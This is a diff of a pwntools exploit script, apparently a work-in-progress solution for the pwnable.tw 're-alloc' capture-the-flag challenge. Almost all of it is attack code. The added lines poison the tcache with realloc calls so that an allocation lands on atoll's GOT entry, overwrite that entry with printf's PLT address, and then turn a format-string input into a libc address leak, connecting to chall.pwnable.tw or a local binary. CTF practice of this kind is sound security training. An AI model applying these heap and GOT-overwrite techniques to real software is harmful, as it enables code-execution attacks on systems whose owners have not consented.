@@ -22,10 +22,20 @@ def free(idx):
   p.sendlineafter('Your choice: ', '3')
   p.sendlineafter('Index:', str(idx))
 
+def leak_libc():
+  p.sendlineafter('Your choice: ', '1')
+  p.sendlineafter('Index:', '%p%p')
+  cont = p.recvline().strip()
+
+  addr = int(cont, 16)
+  return addr
+  
+
 DEBUG = True
 
 p = process('/home/len/pwnable/re-alloc')
-elf = ELF('/lib/i386-linux-gnu/libc.so.6')
+elf = ELF('/lib/x86_64-linux-gnu/libc.so.6')
+
 
 if not DEBUG:  
   p = remote('chall.pwnable.tw', 10106)
@@ -33,29 +43,31 @@ if not DEBUG:
   
 
 context.log_level = 'debug'
+atoll_got = 0x404048
+printf_plt = 0x401070
+libc_offset = None
 
 
 if __name__ == "__main__":
   pdb.set_trace()
-  
-  alloc(0, 0x78, 'a' * 0x70 + p64(0x40))
-  alloc(1, 0x38, 'b' * 0x30 + p64(0x30))
-  # realloc(0, 0x60, 'c' * 0x30)
 
-  realloc(0, 0, 'c' * 0)
-  # realloc(0, 0x30, p64(0x403ff5-8) + 'c' * 0x18)
+  alloc(0, 0x8, p64(atoll_got))
+  realloc(0, 0)  
+  realloc(0, 0x18, p64(atoll_got))
+  alloc(1, 0x8, p64(atoll_got))
+
+  realloc(0, 0x38, p64(atoll_got))
+  free(0)
+  realloc(1, 0x38, p64(atoll_got))
+  free(1)
 
   pdb.set_trace()
-  realloc(0, 0x70, p64(0x403ff5-8) + 'd' * 0x28 + chr(0x40))
-  free(1)
-  alloc(1, 0x78, 'd')
-
-  free(0)
+  alloc(0, 0x8, p64(printf_plt))
 
 
-  # realloc(0, 0, 'c' * 0)
-
-
-  # free(1)
-
+  addr = leak_libc()
+  print('addr: {:#x}'.format(addr))
+  libc_base = p.libc.address
+  print('offset: {:#x}'.format(addr - libc_base)) 
+  
   p.interactive()
